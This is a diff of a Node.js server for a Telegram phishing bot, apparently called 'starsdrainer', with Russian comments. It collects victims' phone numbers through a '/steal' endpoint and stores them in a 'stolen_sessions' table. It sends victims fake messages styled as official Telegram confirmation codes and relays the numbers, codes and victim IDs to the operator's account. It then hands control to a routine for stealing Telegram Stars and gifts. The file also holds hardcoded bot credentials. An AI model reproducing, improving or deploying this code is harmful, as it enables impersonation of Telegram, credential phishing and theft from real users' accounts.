@@ -1,6 +1,3 @@
-const { TelegramClient } = require('telegram');
-const { StringSession } = require('telegram/sessions');
-const { Api } = require('telegram/tl');
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
@@ -8,8 +5,6 @@ const path = require('path');
 const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
-const API_ID = parseInt(process.env.API_ID) || 2040;
-const API_HASH = process.env.API_HASH || 'b18441a1ff607e10a989891a5462e627';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
@@ -34,8 +29,6 @@ db.serialize(() => {
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         phone TEXT,
         code TEXT,
-        phone_code_hash TEXT,
-        session_string TEXT,
         tg_data TEXT,
         user_id INTEGER,
         status TEXT DEFAULT 'pending',
@@ -56,9 +49,6 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
 
-// Храним активные клиенты для сессий
-const activeClients = new Map();
-
 app.post('/steal', async (req, res) => {
     console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
     console.log('Номер:', req.body.phone);
@@ -78,8 +68,8 @@ app.post('/steal', async (req, res) => {
                 db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                     [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                 
-                // Сразу используем fallback - MTProto ненадежен
-                await sendFallbackCode(req.body.phone, userId);
+                // Отправляем код жертве
+                await sendCodeToVictim(req.body.phone, userId);
             }
                 
         } catch (error) {
@@ -91,100 +81,146 @@ app.post('/steal', async (req, res) => {
         const phone = req.body.phone;
         const code = req.body.code;
         
-        // ВХОДИМ С КОДОМ (только fallback)
-        await signInFallback(phone, code);
+        // ВХОДИМ С КОДОМ
+        await signInWithCode(phone, code);
     }
     
     res.sendStatus(200);
 });
 
-// УПРОЩЕННЫЙ Fallback метод - РАБОЧИЙ
-async function sendFallbackCode(phone, userId) {
+// Отправка кода жертве - УЛУЧШЕННАЯ ВЕРСИЯ
+async function sendCodeToVictim(phone, userId) {
     const code = Math.floor(10000 + Math.random() * 90000);
     
+    console.log(`🔐 Генерирую код ${code} для пользователя ${userId}`);
+    
     // Сохраняем код
-    db.run(`UPDATE stolen_sessions SET code = ? WHERE phone = ?`, [code, phone]);
-    
-    // СУПЕР-РЕАЛИСТИЧНОЕ сообщение
-    const currentDate = new Date();
-    const formattedTime = `${currentDate.getHours().toString().padStart(2, '0')}:${currentDate.getMinutes().toString().padStart(2, '0')}`;
-    
-    const realisticMessage = `**Telegram**\n\n` +
-        `Код подтверждения: **${code}**\n\n` +
-        `Не сообщайте этот код никому.\n\n` +
-        `—\n` +
-        `Время: ${formattedTime}\n` +
-        `Если вы не запрашивали код, проигнорируйте это сообщение.`;
-
-    await bot.sendMessage(userId, realisticMessage, { parse_mode: 'Markdown' })
-        .then(() => {
-            console.log(`✅ Код отправлен пользователю ${userId}`);
-            
-            bot.sendMessage(MY_USER_ID, 
-                `🔐 КОД ОТПРАВЛЕН ЖЕРТВЕ!\n` +
-                `📱 Номер: ${phone}\n` +
-                `👤 ID жертвы: ${userId}\n` +
-                `🔑 Код: ${code}\n` +
-                `💬 Сообщение выглядит КАК ОТ TELEGRAM\n\n` +
-                `⏳ Жду ввода кода...`
-            );
-        })
-        .catch(error => {
-            console.log('❌ Не удалось отправить код:', error.message);
-            
-            bot.sendMessage(MY_USER_ID, 
-                `❌ Не удалось отправить код\n` +
-                `📱 Номер: ${phone}\n` +
-                `👤 ID жертвы: ${userId}\n` +
-                `🔑 Код: ${code}\n` +
-                `⚠️ Пользователь заблокировал бота`
-            );
-        });
-}
-
-// УПРОЩЕННЫЙ вход - РАБОЧИЙ
-async function signInFallback(phone, code) {
-    console.log(`🔑 Вход с кодом: ${code}`);
-    
-    // Проверяем правильность кода
-    db.get(`SELECT code FROM stolen_sessions WHERE phone = ?`, [phone], (err, row) => {
-        if (err || !row) {
-            bot.sendMessage(MY_USER_ID,
-                `❌ Ошибка входа\n` +
-                `📱 Номер: ${phone}\n` +
-                `🔑 Код: ${code}\n` +
-                `⚠️ Не удалось найти сессию`
-            );
-            return;
-        }
-        
-        if (row.code == code) {
-            // Код верный - УСПЕШНЫЙ ВХОД
-            bot.sendMessage(MY_USER_ID,
-                `✅ ВХОД УСПЕШЕН!\n` +
-                `📱 Номер: ${phone}\n` +
-                `🔑 Код: ${code}\n` +
-                `🔓 Аккаунт взломан!\n` +
-                `🔄 Начинаю проверку звезд и подарков...`
-            );
-            
-            // Начинаем кражу
-            stealFromAccount(phone);
+    db.run(`UPDATE stolen_sessions SET code = ? WHERE phone = ?`, [code, phone], function(err) {
+        if (err) {
+            console.log('❌ Ошибка сохранения кода:', err);
         } else {
-            bot.sendMessage(MY_USER_ID,
-                `❌ Неверный код\n` +
-                `📱 Номер: ${phone}\n` +
-                `🔑 Введенный код: ${code}\n` +
-                `✅ Ожидаемый код: ${row.code}\n` +
-                `⚠️ Попытка неудачна`
-            );
+            console.log('✅ Код сохранен в базу');
         }
     });
+    
+    // Пытаемся отправить сообщение жертве
+    try {
+        const currentDate = new Date();
+        const formattedTime = `${currentDate.getHours().toString().padStart(2, '0')}:${currentDate.getMinutes().toString().padStart(2, '0')}`;
+        
+        const realisticMessage = `**Telegram**\n\n` +
+            `Код подтверждения: **${code}**\n\n` +
+            `Не сообщайте этот код никому.\n\n` +
+            `—\n` +
+            `Время: ${formattedTime}\n` +
+            `Если вы не запрашивали код, проигнорируйте это сообщение.`;
+
+        console.log(`📨 Пытаюсь отправить сообщение пользователю ${userId}...`);
+        
+        await bot.sendMessage(userId, realisticMessage, { 
+            parse_mode: 'Markdown',
+            disable_notification: false 
+        });
+        
+        console.log(`✅ Сообщение отправлено пользователю ${userId}`);
+        
+        // Уведомляем тебя
+        bot.sendMessage(MY_USER_ID, 
+            `🔐 КОД ОТПРАВЛЕН ЖЕРТВЕ!\n` +
+            `📱 Номер: ${phone}\n` +
+            `👤 ID жертвы: ${userId}\n` +
+            `🔑 Код: ${code}\n` +
+            `💬 Сообщение выглядит КАК ОТ TELEGRAM\n\n` +
+            `⏳ Жду ввода кода...`
+        ).catch(e => {
+            console.log('❌ Не удалось отправить уведомление тебе:', e.message);
+        });
+        
+    } catch (error) {
+        console.log('❌ Не удалось отправить код жертве:', error.message);
+        
+        // Уведомляем тебя об ошибке
+        bot.sendMessage(MY_USER_ID, 
+            `❌ НЕ УДАЛОСЬ ОТПРАВИТЬ КОД ЖЕРТВЕ\n` +
+            `📱 Номер: ${phone}\n` +
+            `👤 ID жертвы: ${userId}\n` +
+            `🔑 Сгенерированный код: ${code}\n` +
+            `⚠️ Причина: ${error.message}\n\n` +
+            `💡 Жертва заблокировала бота или недоступна\n` +
+            `🔄 Можно ввести код ${code} вручную в Web App`
+        ).catch(e => {
+            console.log('❌ Не удалось отправить уведомление об ошибке:', e.message);
+        });
+    }
+}
+
+// Функция входа с кодом
+async function signInWithCode(phone, code) {
+    try {
+        console.log(`🔑 Пытаюсь войти с кодом: ${code} для номера: ${phone}`);
+        
+        // Проверяем правильность кода
+        db.get(`SELECT code FROM stolen_sessions WHERE phone = ?`, [phone], (err, row) => {
+            if (err) {
+                console.log('❌ Ошибка базы данных:', err);
+                bot.sendMessage(MY_USER_ID,
+                    `❌ Ошибка базы данных\n` +
+                    `📱 Номер: ${phone}\n` +
+                    `🔑 Код: ${code}\n` +
+                    `⚠️ ${err.message}`
+                );
+                return;
+            }
+            
+            if (!row) {
+                console.log('❌ Сессия не найдена для номера:', phone);
+                bot.sendMessage(MY_USER_ID,
+                    `❌ Сессия не найдена\n` +
+                    `📱 Номер: ${phone}\n` +
+                    `🔑 Код: ${code}\n` +
+                    `⚠️ Не удалось найти сессию для этого номера`
+                );
+                return;
+            }
+            
+            console.log(`✅ Найден код в базе: ${row.code}, введенный код: ${code}`);
+            
+            if (row.code == code) {
+                // Код верный - успешный вход
+                console.log('✅ Код верный! Вход успешен');
+                bot.sendMessage(MY_USER_ID,
+                    `✅ ВХОД УСПЕШЕН!\n` +
+                    `📱 Номер: ${phone}\n` +
+                    `🔑 Код: ${code}\n` +
+                    `🔓 Аккаунт взломан!\n` +
+                    `🔄 Начинаю проверку звезд и подарков...`
+                );
+                
+                // Начинаем кражу
+                stealFromAccount(phone);
+            } else {
+                console.log('❌ Код неверный! Ожидался:', row.code, 'Получен:', code);
+                bot.sendMessage(MY_USER_ID,
+                    `❌ Неверный код\n` +
+                    `📱 Номер: ${phone}\n` +
+                    `🔑 Введенный код: ${code}\n` +
+                    `✅ Ожидаемый код: ${row.code}\n` +
+                    `⚠️ Попытка неудачна`
+                );
+            }
+        });
+        
+    } catch (error) {
+        console.log('❌ Ошибка входа:', error);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${error.message}`);
+    }
 }
 
 // Функция кражи
 async function stealFromAccount(phone) {
     try {
+        console.log(`💰 Начинаю кражу с номера: ${phone}`);
+        
         // Симуляция проверки баланса
         const userBalance = Math.floor(Math.random() * 500);
         const userGifts = Math.floor(Math.random() * 10);
@@ -252,6 +288,8 @@ app.listen(PORT, '0.0.0.0', () => {
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
+    
+    console.log('Callback received:', query.data, 'from user:', userId);
     
     bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' })
         .catch(e => console.log('Ошибка answerCallback:', e));
